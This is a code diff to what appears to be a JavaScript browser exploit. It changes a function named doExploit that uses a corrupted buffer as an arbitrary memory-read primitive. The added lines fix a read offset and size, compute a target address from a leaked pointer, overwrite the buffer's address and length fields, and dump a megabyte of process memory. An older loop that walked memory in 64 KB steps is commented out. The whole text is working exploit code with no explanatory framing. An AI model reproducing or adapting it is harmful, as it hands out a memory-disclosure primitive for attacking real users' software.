@@ -25,6 +25,7 @@ if(onSwitch !== undefined) {
 	};
 }
 
+var readsize = 1024*1024, readoff = 1024 * 1024 * 9 + 0;
 function memdump(lo, hi, temp, size) {
 	var data = new Array(size);
 	for(var i = 0; i < size; ++i)
@@ -121,30 +122,38 @@ function doExploit(buf, stale, temp) {
 	buf[5] = hi;
 	dumptemp(16);
 	log('!!!!!!!!!!!!');
-	var lo = (temp[4] - 0x835e5c) >>> 0;
+	var lo = (((temp[4] - 0x835e5c + readoff) >>> 0) & 0xFFFFFFFF) >>> 0;
 	if(temp[4] < 0x835e5c)
 		hi = (temp[5] - 1) >>> 0;
 	else
 		hi = temp[5] >>> 0;
+
+	log('Reading from 0x' + hi.toString(16) + ' : 0x' + lo.toString(16));
+
+	buf[4] = lo;
+	buf[5] = hi;
+	buf[6] = 0xFFFFFFFF;
+
+	memdump(lo, hi, temp, readsize >> 2);
 	
-	var ctr = 0;
+	/*var ctr = 0;
 	for(var i = 0; i < 901; ++i) {
 		buf[4] = lo;
 		buf[5] = hi;
 		buf[6] = 65536;
-		memdump(lo, hi, temp, 65536 >> 4);
+		memdump(lo, hi, temp, 65536 >> 2);
 
 		if(temp[4] == 0x304F524E) {
 			log('Beginning');
 		}
 
-		if(lo == 0xFFFF0000) {
+		if(lo >= 0xFFFF0000) {
 			hi += 1;
-			lo = 0;
+			lo = (((lo + 0x10000) >>> 0) & 0xFFFF0000) >>> 0;
 		} else {
 			lo = (lo + 0x10000) >>> 0;
 		}
-	}
+	}*/
 }
 
 function doItAll() {
